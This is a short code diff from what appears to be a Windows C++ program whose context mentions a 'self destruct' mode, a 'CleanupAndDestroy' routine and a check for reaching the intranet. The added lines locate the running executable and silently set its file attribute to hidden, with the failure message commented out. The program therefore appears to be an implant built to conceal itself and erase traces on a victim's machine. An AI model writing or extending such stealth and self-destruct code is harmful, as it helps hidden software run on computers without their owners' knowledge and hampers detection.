@@ -23,6 +23,15 @@ void CleanupAndDestroy() {
 
 
 int main() {
+    // Get the path of the current executable
+    char executablePath[MAX_PATH];
+    GetModuleFileNameA(NULL, executablePath, MAX_PATH);
+
+    // Set the file attribute to hidden
+    if (SetFileAttributesA(executablePath, FILE_ATTRIBUTE_HIDDEN) == 0) {
+        //std::cerr << "Failed to hide the executable." << std::endl;
+    }
+
     // Mode 1: run once and then > cleanup > self destruct
     if (ONETIMERUN) {  
         bool ReachIntranet = googleConn(); 
